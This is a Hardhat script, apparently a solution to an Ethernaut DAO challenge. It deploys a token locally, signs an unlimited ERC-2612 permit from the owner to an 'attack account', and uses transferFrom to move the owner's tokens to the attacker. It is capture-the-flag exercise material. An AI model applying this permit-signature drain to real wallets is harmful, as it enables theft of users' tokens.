const { signERC2612Permit, signDaiPermit } = require("eth-permit");
const { ethers } = require("hardhat");

async function main() {
    const [owner, signer] = await ethers.getSigners();
    console.log("## OWNER: ", owner.address);
    console.log("## ATTACK ACCOUNT: ", signer.address);
    
    //Deploy and set up contracts 
    const edtFactory = await ethers.getContractFactory("EthernautDaoToken");
    const edtContract = await edtFactory.deploy();
    await edtContract.deployed();

    console.log(`## Ethernaut Dao Token deployed to: ${edtContract.address}`);
    const ownerBalance = ethers.utils.formatEther(await edtContract.balanceOf(owner.address));
    console.log(`## OWNER HAS A BALANCE OF ${ownerBalance} Ethernaut Dao Tokens`);
    
    //Simulate signature
    const signature = await signERC2612Permit(owner.provider, edtContract.address, owner.address, signer.address, ethers.constants.MaxUint256.toString());
    console.log("## Signature: ", signature);

    //Permit transaction
    const permitTx = await edtContract.permit(signature.owner, signature.spender, signature.value, signature.deadline, signature.v, signature.r, signature.s);
    await permitTx.wait();

    //Transfer the tokens to the attacker
    const transferTx = await edtContract.connect(signer).transferFrom(owner.address, signer.address, ethers.utils.parseEther("1"));
    await transferTx.wait();

    const newOwnerBalance = ethers.utils.formatEther(await edtContract.balanceOf(owner.address));
    const attackerBalance = ethers.utils.formatEther(await edtContract.balanceOf(signer.address));

    console.log(`NOW THE OWNER HAS ${newOwnerBalance} and the attacker has ${attackerBalance} Ethernaut Dao Tokens`);
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error);
        process.exit(1);
    });